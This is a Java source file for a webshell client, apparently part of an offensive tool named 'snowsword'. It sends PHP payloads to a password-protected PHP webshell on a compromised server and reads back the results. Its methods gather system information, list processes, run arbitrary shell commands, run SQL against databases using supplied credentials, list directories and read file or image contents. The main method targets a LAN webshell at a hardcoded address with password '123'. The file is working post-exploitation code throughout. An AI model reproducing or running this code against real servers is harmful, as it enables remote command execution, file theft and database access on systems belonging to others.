package com.leixiao.snowsword.util;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import okhttp3.*;

import java.io.IOException;
import java.net.URLEncoder;
import java.util.UUID;

public class WebshellOperate {
    private String url;
    private String password;
    private OkHttpClient client = new OkHttpClient();
    public static final MediaType mediaType = MediaType.get("application/x-www-form-urlencoded; charset=utf-8");

    public WebshellOperate(String url, String password){
        this.url = url;
        this.password = password;
    }

    private String post(String url, String content) throws IOException {
        RequestBody body = RequestBody.create(mediaType, content);
        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();
        try (Response response = client.newCall(request).execute()) {
            return response.body().string();
        }
    }

    private String executeCode(String code) throws Exception {
        String poc = "@ini_set(\"display_errors\", \"0\");\n" +
                "@set_time_limit(0);\n" +
                "function output()\n" +
                "{\n" +
                "    $output=ob_get_contents();\n" +
                "    ob_end_clean();\n" +
                "    echo \"%s\";\n" +
                "    echo $output;\n" +
                "    echo \"%s\";\n" +
                "}\n" +
                "ob_start();\n" +
                "try\n" +
                "{\n" +
                "    %s\n" +
                "}\n" +
                "catch(Exception $e)\n" +
                "{\n" +
                "    echo \"ERROR://\".$e->getMessage();\n" +
                "};\n" +
                "output();\n" +
                "die();";
        String randomStart = UUID.randomUUID().toString();
        String randomEnd = UUID.randomUUID().toString();
        poc = String.format(poc, randomStart, randomEnd, code);
        poc = URLEncoder.encode(poc,"UTF-8");

        String response = post(this.url,this.password+"="+poc);
        String result;
        try {
            result = response.substring(response.indexOf(randomStart)+randomStart.length(), response.indexOf(randomEnd));
        }catch (Exception e){
            throw new Exception("Execute code failed. Response: "+response);
        }
        return result;
    }

    public boolean testConnection()  {
        String result = null;
        try {
            result = executeCode("echo 'success';");
            if(result.equals("success")){
                return true;
            }else{
                return false;
            }
        } catch (Exception exception) {
            return false;
        }
    }

    public JSONObject getInfo() throws Exception {
        String poc = "$user = get_current_user();\n" +
                "$hostname = gethostname();\n" +
                "$version = phpversion();\n" +
                "$script_filename = $_SERVER[\"SCRIPT_FILENAME\"]; \n" +
                "$os = php_uname('s').' '.php_uname('r').' '.php_uname('m');\n" +
                "$path = dirname($script_filename);\n" +
                "$random = \"%s\";\n" +
                "echo $user.$random.$hostname.$random.$version.$random.$script_filename.$random.$os.$random.$path;";
        String random = UUID.randomUUID().toString();
        poc = String.format(poc, random);
        String result = executeCode(poc);
        String[] results = result.split(random);
        JSONObject resultObject = new JSONObject();
        resultObject.put("user",results[0]);
        resultObject.put("hostname",results[1]);
        resultObject.put("version",results[2]);
        resultObject.put("script_filename",results[3]);
        resultObject.put("os",results[4]);
        resultObject.put("path",results[5]);
        return  resultObject;
    }

    public String getProcessList() throws Exception {
        String poc = "if( strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {\n" +
                "    system(\"chcp 65001 > NULL & tasklist\");\n" +
                "}else{\n" +
                "    system(\"ps -ef\");\n" +
                "}";
        String result = executeCode(poc);
        return result;
    }

    public JSONObject executeCommand(String path,String command) throws Exception {
        if(command.trim().equals("")){  //如果command传入空，则改为set a=a,该命令在win/linux 下通用，设置变量，只是占个位，防止运行错误
            command = "set a=a";
        }
        command = command.replace("\\","\\\\").replace("\"","\\\"");
        path = path.replace("\\","\\\\").replace("\"","\\\"");
        String poc = "chdir(\"%1$s\");\n" +
                "if( strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {\n" +
                "    system(\"chcp 65001 > NULL & %2$s 2>&1 & echo %3$s & chdir\");\n" +
                "}else{\n" +
                "    system(\"%2$s 2>&1 ; echo %3$s ; pwd\");\n" +
                "}";
        String random = UUID.randomUUID().toString();
        poc = String.format(poc, path, command, random);
        String result = executeCode(poc);
        String[] results = result.split(random);
        JSONObject resultObject = new JSONObject();
        resultObject.put("result",results[0]);
        resultObject.put("path",results[1].trim());
        return resultObject;
    }

    public JSONArray executeSQL(JSONObject databaseCof, String dbName,String SQL,int limit) throws Exception {    //limit限制读取的数据条数，-1为没有限制
        String host = (String) databaseCof.get("host");
        int port = databaseCof.getInteger("port");
        String username = (String) databaseCof.get("username");
        String password = (String) databaseCof.get("password");
        String code = (String) databaseCof.get("code");

        host = host.replace("\\","\\\\").replace("\"","\\\"");
        username = username.replace("\\","\\\\").replace("\"","\\\"");
        password = password.replace("\\","\\\\").replace("\"","\\\"");
        code = code.replace("\\","\\\\").replace("\"","\\\"");
        dbName =dbName.replace("\\","\\\\").replace("\"","\\\"");;
        SQL = SQL.replace("\\","\\\\").replace("\"","\\\"");;

        String poc ="$host = \"%s\";\n" +
                "$port = %d;\n" +
                "$username = \"%s\";\n" +
                "$password = \"%s\";\n" +
                "$code = \"%s\";\n" +
                "$dbname = \"%s\";\n" +
                "$sql = \"%s\";\n" +
                "$limit = %d;\n" +
                "$con=@mysqli_connect($host.\":\".strval($port), $username, $password, $dbname); \n" +
                "if (mysqli_connect_errno()) { \n" +
                "    echo mysqli_connect_error();\n" +
                "}else{\n" +
                "    if (mysqli_query($con, \"SET NAMES \\\"$code\\\"\") && mysqli_multi_query($con,$sql))\n" +
                "    {\n" +
                "        $all_result = array();\n" +
                "        do\n" +
                "        {\n" +
                "            $tmp = array();\n" +
                "            if ($result=mysqli_store_result($con))\n" +
                "            {\n" +
                "                $count = 0;\n" +
                "                while ( ( $row=mysqli_fetch_assoc($result) ) && ( $limit==-1?true:$count++<$limit ) )\n" +
                "                {\n" +
                "                    array_push($tmp,$row);\n" +
                "                }\n" +
                "                mysqli_free_result($result);\n" +
                "            }\n" +
                "            array_push($all_result, $tmp);\n" +
                "        } while (@mysqli_next_result($con));\n" +
                "\n" +
                "        echo json_encode($all_result);\n" +
                "    }else{\n" +
                "        echo mysqli_error($con);\n" +
                "    }\n" +
                "    mysqli_close($con);\n" +
                "}";
        poc = String.format(poc, host, port, username, password, code, dbName, SQL, limit);
        String result = executeCode(poc);

        JSONArray resultArray = null;
        try{
            resultArray = JSON.parseArray(result);
        }catch (Exception e){
            throw new Exception("Execute SQL failed: "+result.toString());
        }

        return resultArray;
    }

    public JSONArray loadFiles(String path) throws Exception{
        path = path.replace("\\","\\\\").replace("\"","\\\"");

        String poc = "$path =\"%s\";\n" +
                "\n" +
                "$result = array();\n" +
                "if(trim($path) == \"\"){\n" +
                "    if( strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {\n" +
                "        for($i=ord('A');$i<=ord('Z');$i++){\n" +
                "            $dirname = chr($i).\":\";\n" +
                "            if(is_dir($dirname)){\n" +
                "                $tmp = array();\n" +
                "                $tmp[\"name\"] = $dirname;\n" +
                "                $tmp[\"realpath\"] = realpath($dirname);\n" +
                "                $tmp[\"is_dir\"] = TRUE;\n" +
                "                $tmp[\"is_leaf\"] = !$tmp[\"is_dir\"];\n" +
                "                array_push($result,$tmp);\n" +
                "            }\n" +
                "        }\n" +
                "    }else{\n" +
                "        $tmp = array();\n" +
                "        $tmp[\"name\"] = \"/\";\n" +
                "        $tmp[\"realpath\"] = \"/\";\n" +
                "        $tmp[\"is_dir\"] = TRUE;\n" +
                "        $tmp[\"is_leaf\"] = !$tmp[\"is_dir\"];\n" +
                "        array_push($result,$tmp);\n" +
                "    }\n" +
                "}else{\n" +
                "    $files = array_diff(scandir($path), array('..', '.'));\n" +
                "    foreach ($files as $filename) {\n" +
                "        $tmp = array();\n" +
                "        $tmp[\"name\"] = $filename;\n" +
                "        $tmp[\"realpath\"] = realpath($path.DIRECTORY_SEPARATOR.$filename);\n" +
                "        $tmp[\"is_dir\"] = is_dir($tmp[\"realpath\"]);\n" +
                "        $tmp[\"is_leaf\"] = !$tmp[\"is_dir\"];\n" +
                "        array_push($result,$tmp);\n" +
                "    }\n" +
                "}\n" +
                "\n" +
                "echo json_encode($result);";
        poc = String.format(poc, path);
        String result = executeCode(poc);

        JSONArray resultArray = null;
        try{
            resultArray = JSON.parseArray(result);
        }catch (Exception e){
            throw new Exception("Load files failed: "+result.toString());
        }

        return resultArray;
    }

    public JSONObject previewFile(String path,int txtLimit,int imgLimit) throws Exception{
        path = path.replace("\\","\\\\").replace("\"","\\\"");

        String poc = "$filename =\"%s\";\n" +
                "$txt_size_limit = %d * 1024;    //Bytes\n" +
                "$img_size_limit = %d * 1024;\n" +
                "\n" +
                "function perms($filename) {\n" +
                "    $perms = fileperms($filename);\n" +
                "    if (($perms & 0xC000) == 0xC000) {\n" +
                "        $info = 's';\n" +
                "    } elseif (($perms & 0xA000) == 0xA000) {\n" +
                "        $info = 'l';\n" +
                "    } elseif (($perms & 0x8000) == 0x8000) {\n" +
                "        $info = '-';\n" +
                "    } elseif (($perms & 0x6000) == 0x6000) {\n" +
                "        $info = 'b';\n" +
                "    } elseif (($perms & 0x4000) == 0x4000) {\n" +
                "        $info = 'd';\n" +
                "    } elseif (($perms & 0x2000) == 0x2000) {\n" +
                "        $info = 'c';\n" +
                "    } elseif (($perms & 0x1000) == 0x1000) {\n" +
                "        $info = 'p';\n" +
                "    } else {\n" +
                "        $info = 'u';\n" +
                "    }\n" +
                "    $info .= (($perms & 0x0100) ? 'r' : '-');\n" +
                "    $info .= (($perms & 0x0080) ? 'w' : '-');\n" +
                "    $info .= (($perms & 0x0040) ?\n" +
                "                (($perms & 0x0800) ? 's' : 'x' ) :\n" +
                "                (($perms & 0x0800) ? 'S' : '-'));\n" +
                "    $info .= (($perms & 0x0020) ? 'r' : '-');\n" +
                "    $info .= (($perms & 0x0010) ? 'w' : '-');\n" +
                "    $info .= (($perms & 0x0008) ?\n" +
                "                (($perms & 0x0400) ? 's' : 'x' ) :\n" +
                "                (($perms & 0x0400) ? 'S' : '-'));\n" +
                "    $info .= (($perms & 0x0004) ? 'r' : '-');\n" +
                "    $info .= (($perms & 0x0002) ? 'w' : '-');\n" +
                "    $info .= (($perms & 0x0001) ?\n" +
                "                (($perms & 0x0200) ? 't' : 'x' ) :\n" +
                "                (($perms & 0x0200) ? 'T' : '-'));\n" +
                "    return  $info;\n" +
                "}\n" +
                "\n" +
                "function human_filesize($bytes, $decimals = 2) {\n" +
                "    $sz = 'BKMGTP';\n" +
                "    $factor = floor((strlen($bytes) - 1) / 3);\n" +
                "    return sprintf(\"%%.{$decimals}f\", $bytes / pow(1024, $factor)) . @$sz[$factor];\n" +
                "}\n" +
                "\n" +
                "function is_txt($filename,$limit) {\n" +
                "    return json_encode(file_get_contents($filename, FALSE, NULL, 0, $limit))?true:false;\n" +
                "}\n" +
                "\n" +
                "function is_img($filename) {\n" +
                "    $file = fopen($filename, \"rb\"); \n" +
                "    $bin = fread($file, 2); \n" +
                "    fclose($file); $strInfo = @unpack(\"C2chars\", $bin);\n" +
                "    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); \n" +
                "    $fileType = ''; \n" +
                "    if($typeCode == 255216 /*jpg*/ || $typeCode == 7173 /*gif*/ || $typeCode == 13780 /*png*/) { \n" +
                "        return true;\n" +
                "    }else{ \n" +
                "        return false;\n" +
                "    }\n" +
                "}\n" +
                "\n" +
                "function list_dir($dirname) {\n" +
                "    $result = array();\n" +
                "\n" +
                "    $files = array_diff(scandir($dirname), array('..', '.'));\n" +
                "    foreach ($files as $filename) {\n" +
                "        $tmp = array();\n" +
                "        $tmp['name'] = $filename;\n" +
                "        $realpath = realpath($dirname.DIRECTORY_SEPARATOR.$filename);\n" +
                "        $tmp['realpath'] = $realpath;\n" +
                "        $tmp['perms'] = perms($realpath);\n" +
                "        $tmp['size'] = human_filesize(filesize($realpath));\n" +
                "        $tmp['inode_change_time'] = date(\"Y-m-d H:i:s\", filectime($realpath));\n" +
                "        $tmp['modification_time'] = date(\"Y-m-d H:i:s\", filemtime($realpath));\n" +
                "        $tmp['is_dir'] = is_dir($realpath);\n" +
                "        array_push($result,$tmp);\n" +
                "    }\n" +
                "    return $result;\n" +
                "}\n" +
                "\n" +
                "$result = array();\n" +
                "$realpath = realpath($filename);\n" +
                "$result['realpath'] = $realpath;\n" +
                "$result['perms'] = perms($realpath);\n" +
                "$result['size'] = human_filesize(filesize($realpath));\n" +
                "$result['inode_change_time'] = date(\"Y-m-d H:i:s\", filectime($realpath));\n" +
                "$result['modification_time'] = date(\"Y-m-d H:i:s\", filemtime($realpath));\n" +
                "$result['is_dir'] = is_dir($realpath);\n" +
                "if($result['is_dir']){\n" +
                "    $result['preview'] = list_dir($realpath);\n" +
                "}else{\n" +
                "    $result['is_img'] = is_img($realpath);\n" +
                "    $result['is_txt'] = is_txt($realpath,$txt_size_limit);\n" +
                "    \n" +
                "    if($result['is_img']){\n" +
                "        if( filesize($realpath)<=$img_size_limit ){\n" +
                "            $result['preview'] = \"data:image/jpg/png/gif;base64,\".base64_encode(file_get_contents($realpath));\n" +
                "        }else{\n" +
                "            $result['preview'] = \"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSI+DQogIDx0ZXh0IHg9IjAiIHk9IjE1Ij5JdCdzIHRvbyBsb25nIHRvIHNob3cuLi48L3RleHQ+DQo8L3N2Zz4=\";\n" +
                "        }\n" +
                "    }elseif($result['is_txt']){\n" +
                "        if( filesize($realpath)<=$txt_size_limit ){\n" +
                "            $result['preview'] = file_get_contents($realpath);\n" +
                "        }else{\n" +
                "            $result['preview'] = \"It's too long to show...\";\n" +
                "        }\n" +
                "    }else{\n" +
                "        $result['preview'] = \"\";\n" +
                "    }\n" +
                "}\n" +
                "\n" +
                "echo json_encode($result);";
        poc = String.format(poc, path,txtLimit,imgLimit);
        String result = executeCode(poc);

        JSONObject resultObject = null;
        try{
            resultObject = JSON.parseObject(result);
        }catch (Exception e){
            throw new Exception("Preview file failed: "+result.toString());
        }

        return resultObject;
    }



    public static void main(String[] args) throws Exception {
        String url = "http://192.168.0.110:8082/ma.php";
        //url ="http://127.0.0.1:8082/ma.php";
        String pass ="123";
        WebshellOperate webshellOperate = new WebshellOperate(url,pass);
        JSONObject res = webshellOperate.previewFile("D:",100,100);
        System.out.println(res);
    }

}
